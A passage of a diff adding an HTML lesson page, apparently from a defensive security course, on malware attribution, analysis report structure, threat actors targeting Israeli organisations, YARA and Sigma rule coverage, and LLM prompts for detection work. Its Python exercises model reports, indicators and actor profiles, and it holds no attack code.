+  &#x27;total_techniques&#x27;: 3,
+  &#x27;full_coverage&#x27;: 1,
+  &#x27;gaps&#x27;: {
+    &#x27;T1059.001&#x27;: &#x27;sigma_missing&#x27;,
+    &#x27;T1071.001&#x27;: &#x27;yara_missing&#x27;
+  }
+}
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>pairs_input = [T1055_PAIR]
+# Add 2 more DetectionPair objects with partial coverage
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can auto-generate the complementary Sigma rule when given a YARA rule, and vice versa — bridging static and behavioral coverage.
+<strong>Threat:</strong> Attackers run their malware against both YARA and Sigma pipelines in CI to verify evasion before deploying.
+<strong>Opportunity:</strong> Feed a YARA rule to an LLM: &quot;Generate the Sigma rule that covers the same ATT&amp;CK technique from the behavioral angle (Sysmon).&quot; Then feed a Sigma rule: &quot;Generate the YARA rule for the binary artifact this behavior would produce.&quot;
+<strong>Prompt to try:</strong> <code>&quot;Given this YARA rule [rule text] that detects process hollowing binaries, write a complementary Sigma rule that detects the same technique through Sysmon events. Include all relevant EIDs (1, 8, 10) and add a filter for known false positives.&quot;</code></p>
+<hr />
+<h2 id="day-5">Day 5 — Full Malware Analysis Workflow and Royal Road</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="18-5"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=XYtPSG4E5no" target="_blank" rel="noopener"><b>CRITIQUE: Writing a Malware Analysis Report</b><small>Amr Thabet - MalTrak</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=malware%20analysis%20workflow%20report%20writing%20threat%20intelligence%20integration" target="_blank" rel="noopener">malware analysis workflow report writing threat intelligence integration</a></p></div>
+<hr />
+<h3>Concept 1 — Threat Actor Attribution</h3>
+<p>Attribution connects a malware sample to a known threat actor or group using technical indicators: infrastructure overlap, code reuse, TTPs, malware family membership. It is probabilistic, not deterministic.</p>
+<p>Attribution evidence hierarchy (strongest to weakest):</p>
+<ol>
+<li>Shared unique code (copy-paste, reused encryption keys, same builder tool artifacts)</li>
+<li>Shared infrastructure (same C2 IPs/domains, shared TLS certificates, ASN patterns)</li>
+<li>Matching TTPs (same ATT&amp;CK chain across campaigns)</li>
+<li>Victimology overlap (same industry/country targets)</li>
+<li>Language/timezone artifacts in PDB paths, compile timestamps, error messages</li>
+</ol>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass, field
+from typing import Optional
+from enum import Enum
+
+class ConfidenceLevel(Enum):
+    HIGH   = &quot;high&quot;
+    MEDIUM = &quot;medium&quot;
+    LOW    = &quot;low&quot;
+
+@dataclass
+class AttributionIndicator:
+    indicator_type: str    # &quot;code_reuse&quot;, &quot;infrastructure&quot;, &quot;ttp&quot;, &quot;victimology&quot;, &quot;artifact&quot;
+    description: str
+    evidence: str
+    confidence: ConfidenceLevel
+
+@dataclass
+class AttributionAssessment:
+    threat_actor: str
+    confidence: ConfidenceLevel
+    indicators: list[AttributionIndicator]
+    caveats: list[str] = field(default_factory=list)
+    alternative_actors: list[str] = field(default_factory=list)
+
+    def strongest_indicators(self) -&gt; list[AttributionIndicator]:
+        priority = [&quot;code_reuse&quot;, &quot;infrastructure&quot;, &quot;ttp&quot;, &quot;victimology&quot;, &quot;artifact&quot;]
+        return sorted(self.indicators, key=lambda i: priority.index(i.indicator_type) if i.indicator_type in priority else 99)
+
+    def to_report_section(self) -&gt; str:
+        lines = [
+            f&quot;## Attribution Assessment&quot;,
+            f&quot;**Attributed to:** {self.threat_actor}&quot;,
+            f&quot;**Confidence:** {self.confidence.value.upper()}&quot;,
+            &quot;&quot;,
+            &quot;### Supporting Indicators&quot;,
+        ]
+        for ind in self.strongest_indicators():
+            lines.append(f&quot;- [{ind.indicator_type.upper()}] {ind.description}&quot;)
+            lines.append(f&quot;  Evidence: {ind.evidence}&quot;)
+        if self.caveats:
+            lines.append(&quot;\n### Caveats&quot;)
+            for c in self.caveats:
+                lines.append(f&quot;- {c}&quot;)
+        if self.alternative_actors:
+            lines.append(&quot;\n### Alternative Hypotheses&quot;)
+            for a in self.alternative_actors:
+                lines.append(f&quot;- {a}&quot;)
+        return &quot;\n&quot;.join(lines)
+
+SAMPLE_ATTRIBUTION = AttributionAssessment(
+    threat_actor=&quot;APT-UNKNOWN-01&quot;,
+    confidence=ConfidenceLevel.MEDIUM,
+    indicators=[
+        AttributionIndicator(&quot;infrastructure&quot;, &quot;C2 IP 185.220.101.5 shared with prior campaign&quot;, &quot;IP reputation feed + passive DNS&quot;, ConfidenceLevel.MEDIUM),
+        AttributionIndicator(&quot;code_reuse&quot;,     &quot;AsyncRAT builder artifacts match known toolset&quot;, &quot;Hex pattern match in PE overlay&quot;, ConfidenceLevel.HIGH),
+        AttributionIndicator(&quot;ttp&quot;,            &quot;PICERL chain matches documented playbook&quot;, &quot;ATT&amp;CK T1055.012 + T1547.001 + T1071.001&quot;, ConfidenceLevel.MEDIUM),
+    ],
+    caveats=[&quot;False-flag operations can mimic another actor&#x27;s tools&quot;, &quot;Infrastructure may be rented/shared&quot;],
+    alternative_actors=[&quot;Criminal group using leaked AsyncRAT builder&quot;],
+)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Call <code>SAMPLE_ATTRIBUTION.to_report_section()</code> and print the output. Then write a function <code>merge_attributions(assessments: list[AttributionAssessment]) -&gt; AttributionAssessment</code> that consolidates multiple assessments for the same actor by merging indicators and taking the lowest confidence (most conservative).</p>
+<p>Expected output:</p>
+<pre><code>## Attribution Assessment
+**Attributed to:** APT-UNKNOWN-01
+**Confidence:** MEDIUM
+
+### Supporting Indicators
+- [CODE_REUSE] AsyncRAT builder artifacts match known toolset
+  Evidence: Hex pattern match in PE overlay
+- [INFRASTRUCTURE] C2 IP 185.220.101.5 shared with prior campaign
+  ...
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>assessment_input = SAMPLE_ATTRIBUTION
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>Concept 2 — Malware Analysis Report Structure</h3>
+<p>A complete malware analysis report has six sections:</p>
+<ol>
+<li><strong>Executive Summary</strong> — 3 sentences: what it is, what it does, risk level</li>
+<li><strong>Sample Information</strong> — hashes, file type, compile timestamp, packer</li>
+<li><strong>Static Analysis</strong> — strings, imports, sections, YARA hits</li>
+<li><strong>Dynamic Analysis</strong> — behavioral summary, persistence, C2, ATT&amp;CK matrix</li>
+<li><strong>Detection</strong> — YARA rules, Sigma rules, IOCs (IPs, domains, hashes, mutexes)</li>
+<li><strong>Attribution</strong> — threat actor assessment, confidence, caveats</li>
+</ol>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass, field
+from datetime import datetime
+from typing import Optional
+import json
+
+@dataclass
+class MalwareAnalysisReport:
+    report_id: str
+    analyst: str
+    generated_at: datetime
+    static_result: StaticAnalysisResult
+    sandbox_report: SandboxReport
+    technique_matrix: dict[str, TechniqueHit]
+    yara_rules: list[ManagedYARARule]
+    attribution: Optional[AttributionAssessment]
+    iocs: list[str] = field(default_factory=list)
+
+    def _collect_iocs(self) -&gt; list[str]:
+        iocs = []
+        iocs.extend(self.static_result.suspicious_strings)
+        for ev in self.sandbox_report.events:
+            if ev.category.value == &quot;network&quot; and ev.operation == &quot;connect&quot;:
+                iocs.append(f&quot;network:{ev.target}&quot;)
+        iocs.append(f&quot;md5:{self.static_result.md5}&quot;)
+        iocs.append(f&quot;sha256:{self.static_result.sha256}&quot;)
+        return list(dict.fromkeys(iocs))  # deduplicate preserving order
+
+    def render_full_report(self) -&gt; str:
+        self.iocs = self._collect_iocs()
+        lines = [
+            f&quot;# Malware Analysis Report — {self.report_id}&quot;,
+            f&quot;**Analyst:** {self.analyst}  &quot;,
+            f&quot;**Date:** {self.generated_at.strftime(&#x27;%Y-%m-%d&#x27;)}  &quot;,
+            &quot;&quot;,
+            &quot;## 1. Executive Summary&quot;,
+            f&quot;Sample `{self.static_result.filename}` is classified as **{self.sandbox_report.verdict}** &quot;
+            f&quot;({self.sandbox_report.malware_family or &#x27;unknown family&#x27;}). &quot;
+            f&quot;It achieves persistence via registry Run key and communicates with a C2 at &quot;
+            f&quot;{&#x27;, &#x27;.join(self.sandbox_report.c2_summary()) or &#x27;unknown&#x27;}. &quot;
+            f&quot;Risk level: HIGH.&quot;,
+            &quot;&quot;,
+            &quot;## 2. Sample Information&quot;,
+            f&quot;- MD5:    `{self.static_result.md5}`&quot;,
+            f&quot;- SHA256: `{self.static_result.sha256}`&quot;,
+            f&quot;- Size:   {self.static_result.file_size:,} bytes&quot;,
+            &quot;&quot;,
+            &quot;## 3. Static Analysis&quot;,
+            f&quot;- Suspicious imports ({len(self.static_result.suspicious_imports)}): &quot;
+            + &quot;, &quot;.join(self.static_result.suspicious_imports[:5]),
+            f&quot;- Suspicious strings ({len(self.static_result.suspicious_strings)}): listed below&quot;,
+        ]
+        for s in self.static_result.suspicious_strings[:5]:
+            lines.append(f&quot;  - {s}&quot;)
+        lines.extend([
+            &quot;&quot;,
+            &quot;## 4. Dynamic Analysis&quot;,
+            f&quot;- Verdict: {self.sandbox_report.verdict}&quot;,
+            f&quot;- Family:  {self.sandbox_report.malware_family}&quot;,
+            f&quot;- ATT&amp;CK techniques: {&#x27;, &#x27;.join(self.technique_matrix.keys())}&quot;,
+        ])
+        if self.attribution:
+            lines.extend([&quot;&quot;, self.attribution.to_report_section()])
+        lines.extend([
+            &quot;&quot;,
+            &quot;## 5. IOCs&quot;,
+        ])
+        for ioc in self.iocs[:10]:
+            lines.append(f&quot;- `{ioc}`&quot;)
+        lines.extend([
+            &quot;&quot;,
+            &quot;## 6. YARA Rules&quot;,
+        ])
+        for r in self.yara_rules:
+            lines.append(f&quot;- {r.rule_id}: {r.rule.name} ({r.status.value})&quot;)
+        return &quot;\n&quot;.join(lines)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Build a <code>MalwareAnalysisReport</code> using the <code>static_result</code>, <code>sandbox_report</code>, <code>technique_matrix</code>, YARA rules, and attribution from earlier exercises. Call <code>render_full_report()</code> and print the first 40 lines.</p>
+<p>Expected output:</p>
+<pre><code># Malware Analysis Report — MAR-2024-001
+**Analyst:** analyst_alice
+**Date:** 2024-01-15
+
+## 1. Executive Summary
+Sample `malware.exe` is classified as **malicious** (AsyncRAT)...
+
+## 2. Sample Information
+- MD5:    `abc123`
+...
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>report_id   = &quot;MAR-2024-001&quot;
+analyst_name = &quot;analyst_alice&quot;
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>Concept 3 — Israeli Threat Landscape Context</h3>
+<p>Israeli organizations face a distinct set of threat actors: state-sponsored groups (Iranian APT groups: APT33/Charming Kitten, APT34/OilRig, Agrius), hacktivists (Predatory Sparrow, Moses Staff), and financially motivated ransomware groups.</p>
+<p>Common TTP patterns against Israeli targets:</p>
+<ul>
+<li>Spearphishing with Hebrew-language lures (Outlook exploits, malicious DOCX)</li>
+<li>VPN credential spraying (Pulse Secure, Fortinet, Citrix)</li>
+<li>Wiper malware disguised as ransomware (Agrius Apostle/Fantasy)</li>
+<li>Supply-chain attacks via Israeli MSPs and defense contractors</li>
+<li>Telegram/WhatsApp-based social engineering against IDF conscripts</li>
+</ul>
+<p>YARA rule naming convention for this threat landscape: prefix with country code and actor: <code>IL_APT34_</code>, <code>IL_AGRIUS_</code>, <code>IL_MOSES_STAFF_</code>.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+
+@dataclass
+class ThreatActorProfile:
+    actor_id: str
+    common_name: str
+    nation_state: str
+    motivation: str        # &quot;espionage&quot;, &quot;sabotage&quot;, &quot;financial&quot;, &quot;hacktivism&quot;
+    primary_targets: list[str]
+    common_tools: list[str]
+    known_techniques: list[str]  # ATT&amp;CK IDs
+    yara_rule_prefix: str
+
+    def detection_priority(self, org_sector: str) -&gt; str:
+        if org_sector.lower() in [t.lower() for t in self.primary_targets]:
+            return &quot;HIGH&quot;
+        return &quot;MEDIUM&quot;
+
+IL_THREAT_ACTORS = [
+    ThreatActorProfile(
+        actor_id=&quot;APT33&quot;,
+        common_name=&quot;Charming Kitten / PHOSPHORUS&quot;,
+        nation_state=&quot;Iran&quot;,
+        motivation=&quot;espionage&quot;,
+        primary_targets=[&quot;defense&quot;, &quot;aerospace&quot;, &quot;energy&quot;, &quot;research&quot;],
+        common_tools=[&quot;POWERTON&quot;, &quot;RULER&quot;, &quot;POSHC2&quot;, &quot;custom backdoors&quot;],
+        known_techniques=[&quot;T1566.001&quot;, &quot;T1078&quot;, &quot;T1059.001&quot;, &quot;T1071.001&quot;, &quot;T1547.001&quot;],
+        yara_rule_prefix=&quot;IL_APT33_&quot;,
+    ),
+    ThreatActorProfile(
+        actor_id=&quot;AGRIUS&quot;,
+        common_name=&quot;Agrius&quot;,
+        nation_state=&quot;Iran&quot;,
+        motivation=&quot;sabotage&quot;,
+        primary_targets=[&quot;financial&quot;, &quot;insurance&quot;, &quot;government&quot;, &quot;hrtech&quot;],
+        common_tools=[&quot;Apostle&quot;, &quot;Fantasy&quot;, &quot;IPsec Helper&quot;],
+        known_techniques=[&quot;T1485&quot;, &quot;T1486&quot;, &quot;T1059.001&quot;, &quot;T1562.001&quot;],
+        yara_rule_prefix=&quot;IL_AGRIUS_&quot;,
+    ),
+]
+
+def assess_actor_relevance(sector: str, actors: list[ThreatActorProfile]) -&gt; list[tuple[ThreatActorProfile, str]]:
+    return [(actor, actor.detection_priority(sector)) for actor in actors]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Call <code>assess_actor_relevance(&quot;defense&quot;, IL_THREAT_ACTORS)</code>. Print each actor name, motivation, and priority. Then generate a YARA rule name for an Agrius wiper detection using the naming convention.</p>
+<p>Expected output:</p>
+<pre><code>APT33 (Charming Kitten): espionage — Priority: HIGH
+AGRIUS (Agrius): sabotage — Priority: HIGH
+YARA rule name for Agrius wiper: IL_AGRIUS_Apostle_Wiper_v1
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>org_sector  = &quot;defense&quot;
+actor_list  = IL_THREAT_ACTORS
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can map a malware sample's behavior to known Israeli threat actor TTPs using public threat intelligence reports, accelerating attribution.
+<strong>Threat:</strong> Nation-state actors use LLMs to generate hyper-targeted Hebrew-language spearphishing lures, improving click rates significantly.
+<strong>Opportunity:</strong> Feed a behavioral report JSON and a list of known threat actor profiles to an LLM: &quot;Which actor does this behavioral profile most closely match? What evidence would strengthen the attribution?&quot;
+<strong>Prompt to try:</strong> <code>&quot;Given this malware behavioral report [JSON] and these threat actor profiles [profiles], which actor is the strongest match and why? What additional forensic evidence (file artifacts, registry keys, network patterns) would let you increase confidence from MEDIUM to HIGH?&quot;</code></p>
+<hr />
+<h2>Royal Road Standard — Week 18</h2>
+<p><strong>Task:</strong> Add YARA integration to the detection pipeline.</p>
+<p><strong>Builds on:</strong> W17 <code>forensics/hollow_hunt.py</code> (produces memory forensics JSON), W13 Sigma rules, W08 Sysmon dataset.</p>
+<p><strong>Deliverable:</strong></p>
+<pre><code>yara/
+├── rules/
+│   ├── T1055_hollow_process_injector.yar    ← HOLLOW_INJECTOR_RULE (production status)
+│   └── T1071_asyncrat_c2_beacon.yar         ← C2_BEACON_RULE (test status)
+├── yara_pipeline.py    ← YARARuleRepository, run_yara_pipeline_scan()
+│                          argparse CLI: --rules-dir, --artifacts-dir, --output JSON
+└── scan_output/
+    └── pipeline_scan_results.json           ← sample output scanning SIMULATED_PE_DATA
+                                                { &quot;rules_compiled&quot;: 1, &quot;files_scanned&quot;: 1,
+                                                  &quot;total_matches&quot;: 1, &quot;matches&quot;: [...] }
+</code></pre><p><code>yara_pipeline.py</code> integrates with W16 <code>ir/triage.py</code> by accepting a <code>triage_output.json</code> path and scanning all artifact paths listed in the evidence chain.</p>
+<p><strong>Stretch goal:</strong> Add a <code>--compare-baseline</code> flag that compares the current scan results against a known-good baseline (clean corpus scan from a previous run). Alert if a rule fires on a file that was clean in the baseline — this detects retroactive IOC matches after a rule update.</p>
+<div class="pager"><a class="btn ghost" href="week-17.html">&larr; Week 17</a><a class="btn ghost" href="week-19.html">Week 19 &rarr;</a></div>
+</main></body></html>
